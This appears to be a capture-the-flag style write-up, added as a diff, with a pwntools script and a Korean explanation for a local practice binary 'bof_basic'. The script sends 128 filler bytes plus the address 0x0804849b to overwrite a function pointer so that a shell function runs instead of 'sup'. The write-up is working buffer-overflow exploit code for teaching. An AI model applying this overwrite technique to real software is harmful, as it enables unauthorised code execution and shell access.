@@ -1,0 +1,19 @@
+from pwn import *
+r = process('./bof_basic')
+pay = b'a'* 128
+pay +=p32(0x0804849b)
+
+r.sendline(pay)
+r.interactive()
+____________________
+Python Exploit Code
+____________________
+v5 = void형 함수 sup의 주소를 담고 있다.
+따라서 v5();를 하면 sup을 호출하게 되는데, 여기서
+shell 권한을 취득하기 위해선 shell함수를 호출해야한다.
+따라서 s로 문자열을 받을 때 bof를 일으켜야한다.
+s부터 v5까지 거리는 128byte기 때문에,
+128byte만큼을 아무값이나 채워주고, 
+bof가 일어나면 v5에 pay += p32(0x0804849b) 를 통해
+Shell 함수의 주소를 대입한다.
+이후 v5(); 를 하면 Sup대신 Shell함수가 호출되어 Shell 권한을 획득한다.
